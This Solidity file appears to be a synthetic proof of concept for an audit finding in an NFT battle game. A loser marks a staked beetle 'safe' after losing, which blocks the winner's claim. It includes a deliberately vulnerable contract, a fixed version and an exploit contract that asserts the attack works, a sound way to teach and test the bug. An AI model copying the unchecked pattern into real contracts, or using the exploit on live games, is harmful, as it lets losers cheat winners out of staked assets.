// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Beetle markBeetleSafe — a loser shields the NFT after the battle
    (Shieldify, C-01, August 2025).
    SYNTHETIC, cheatcode-free, one block.
    markBeetleSafe only checks that the caller staked the token. It does not
    care that the battle is already over. claimBeetleFromVictory will not
    transfer a safe beetle, so the opponent receives nothing and the NFT
    stays locked in the game, still staked to the loser.
    Control rejects the post-battle mark. The same claim then pays the
    opponent the NFT. N = 1 beetle. */

contract BeetleNFT {
    string public constant name = "Beetle";
    string public constant symbol = "BEETLE";
    uint8 public constant decimals = 0;

    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public allowance;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        balanceOf[to] += 1;
    }

    function approve(address spender, uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        allowance[id] = spender;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "owner");
        require(from == msg.sender || allowance[id] == msg.sender, "allow");
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        ownerOf[id] = to;
        allowance[id] = address(0);
    }

    function transfer(address to, uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        balanceOf[msg.sender] -= 1;
        balanceOf[to] += 1;
        ownerOf[id] = to;
    }
}

contract Game {
    struct Battle {
        address winner;
        address loser;
        uint256 tokenId;
        bool settled;
    }

    BeetleNFT public nft;
    mapping(uint256 => address) public isStaked;
    mapping(address => uint256) public safeBeetle;
    mapping(uint256 => Battle) public battles;
    mapping(uint256 => uint256) public battleOf;
    bool public claimBlocked;

    error InvalidTokenOwner();

    event SafeBeetleUpdated(address indexed staker, uint256 tokenId);

    constructor(BeetleNFT nft_) {
        nft = nft_;
    }

    function stake(uint256 tokenId) external {
        nft.transferFrom(msg.sender, address(this), tokenId);
        isStaked[tokenId] = msg.sender;
    }

    function finishBattle(address winner, address loser, uint256 tokenId) external {
        require(isStaked[tokenId] == loser, "staker");
        battles[1] = Battle(winner, loser, tokenId, false);
        battleOf[tokenId] = 1;
    }

    function markBeetleSafe(uint256 _tokenId) public virtual {
        if (isStaked[_tokenId] != msg.sender) revert InvalidTokenOwner();
        // @> VULN: no timing check, so the loser can shield this NFT after the battle
        safeBeetle[msg.sender] = _tokenId;

        emit SafeBeetleUpdated(msg.sender, _tokenId);
    }

    function claimBeetleFromVictory(uint256 battleId) public {
        Battle memory b = battles[battleId];
        require(b.winner == msg.sender, "winner");
        require(!b.settled, "settled");
        battles[battleId].settled = true;
        if (safeBeetle[b.loser] == b.tokenId) {
            claimBlocked = true;
            return;
        }
        isStaked[b.tokenId] = address(0);
        nft.transfer(b.winner, b.tokenId);
    }
}

contract GameFixed is Game {
    error TooLate();

    constructor(BeetleNFT nft_) Game(nft_) {}

    function markBeetleSafe(uint256 _tokenId) public override {
        if (isStaked[_tokenId] != msg.sender) revert InvalidTokenOwner();
        // FIX: a beetle that already lost a battle cannot be marked safe
        if (battleOf[_tokenId] != 0) revert TooLate();
        safeBeetle[msg.sender] = _tokenId;
        emit SafeBeetleUpdated(msg.sender, _tokenId);
    }
}

contract Opponent {
    function claim(Game game, uint256 battleId) external {
        game.claimBeetleFromVictory(battleId);
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 1;
    uint256 public constant BATTLE_ID = 1;

    BeetleNFT public nft;
    Game public game;
    Opponent public opponent;
    uint256 public opponentBalance;
    uint256 public locked;

    constructor() {
        nft = new BeetleNFT();
        game = new Game(nft);
        opponent = new Opponent();
    }

    function run() external {
        nft.mint(address(this), TOKEN_ID);
        nft.approve(address(game), TOKEN_ID);
        game.stake(TOKEN_ID);
        game.finishBattle(address(opponent), address(this), TOKEN_ID);
        game.markBeetleSafe(TOKEN_ID);
        opponent.claim(game, BATTLE_ID);
        opponentBalance = nft.balanceOf(address(opponent));
        locked = nft.balanceOf(address(game));
        require(game.safeBeetle(address(this)) == TOKEN_ID, "not shielded");
        require(game.claimBlocked(), "claim was not blocked");
        require(opponentBalance == 0, "opponent received the beetle");
        require(locked == 1, "beetle is not locked");
        require(game.isStaked(TOKEN_ID) == address(this), "loser lost the stake");
    }
}
